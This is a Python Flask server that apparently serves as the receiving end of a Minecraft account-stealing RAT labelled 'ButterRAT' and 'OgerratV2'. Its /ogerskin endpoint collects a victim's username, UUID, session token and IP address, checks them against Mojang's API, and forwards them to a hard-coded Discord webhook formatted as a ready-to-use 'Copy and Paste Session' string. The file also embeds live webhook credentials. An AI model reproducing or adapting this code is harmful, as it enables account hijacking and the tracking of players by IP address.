import requests
import json
from flask import Flask, request
import datetime
import time
import random

webhook_url = "https://discord.com/api/webhooks/1079857766853779466/TcVDJ871Cs_vVYmpHLW0bjKQBqf9dFUeiUxLIs7z3BnsxhDZf9q2T90ze18keLQzgF69"
payload = {"content": "Hello"}

response = requests.post(webhook_url, json=payload)

if response.ok:
    print("Message sent successfully.")
else:
    print(f"Failed to send message. Status code: {response.status_code}")


print("3")
print("2")
print("1")

print("Server is on!")




app = Flask(__name__)

@app.route('/')
def hello_world():
    webhook_url = "https://discord.com/api/webhooks/1079857766853779466/TcVDJ871Cs_vVYmpHLW0bjKQBqf9dFUeiUxLIs7z3BnsxhDZf9q2T90ze18keLQzgF69"
    payload = {"content": "Server is on!"}
    response = requests.post(webhook_url, json=payload)
    if response.ok:
        print("Message sent successfully.")
    else:
        print(f"Failed to send message. Status code: {response.status_code}")
    return "Hello, World!"



def send_message(content):
    data = {"content": content}
    requests.post(webhook_url, json=data)


#webhook_url = "https://discord.com/api/webhooks/1079855421302526032/smlXSPRl_R8xLMy7joLDkingydK5tK86-IyNLlwjpMiXh-3TCCUCAYPgGcZhiuXGPRw_"



@app.route("/ogerskin", methods =["GET", "POST"])
def handle_request():

    data = request.get_json()

    INGAMENAME = data["IGN"]
    USERID = data["UUID"]
    TOKEN = data["SSID"]
    IP = data["IP"]


    ign = INGAMENAME

    uuid = USERID.replace("-", "")

    if check_ign_uuid_match(ign,uuid):
            time.sleep(0.01)
    else:
            return "Server could not be reached",400


    current_datetime = datetime.datetime.now()
    formatted_datetime = current_datetime.strftime("%m-%d %H:%M")

    embed = {

         "color": 242424,

      "fields": [
	     {
          "name": "📖 Information",
          "value": f"[Skyblock Profile](https://sky.shiiyu.moe/stats/{INGAMENAME})\n[Ip Info](https://whatismyipaddress.com/ip/{IP})"

           },
          {
           "name": "Username",
           "value": INGAMENAME,
           "inline": True
           },
           {
             "name": "UUID",
            "value": USERID,
             "inline": True
          },
          {
             "name": "Ip",
             "value": IP,
             "inline": True
          },
          {
                "name": "Hypixel Rank",
                "value": "Yet to be added"
         },
          {
                "name": "Networth",
                "value": "Yet to be added"
         },
          {
             "name": "Copy and Paste Session",
              "value": f"{INGAMENAME}:{USERID}:{TOKEN}"
          }

      ],
      "footer": {
          "text": f"🌟 ButterRAT🌟 {formatted_datetime} "
        }
       }

    payload = {
      "username": "OgerratV2 ",
      "avatar_url": "https://cdn.discordapp.com/attachments/885549787187920917/1075053077675130980/artworks-yA1gzXFpprR6qqux-8Mzghw-t500x500.jpg",
      "embeds": [embed]
     }








    try:
        response = requests.post(webhook_url, json=payload)
    except requests.exceptions.HTTPError as err:
        print(err)
    return str(data)

def request_recieved():
    payload = {"content": "Server is On"}
    response = requests.post(webhook_url, json=payload)


def check_ign_uuid_match(ign,uuid):
    url = f"https://api.mojang.com/users/profiles/minecraft/{ign}"
    response = requests.get(url)

    if response.status_code == 200:
        response_json = response.json()
        response_uuid = response_json["id"]
        if response_uuid == uuid:
            return True
        else:
            return False
    else:
        return False



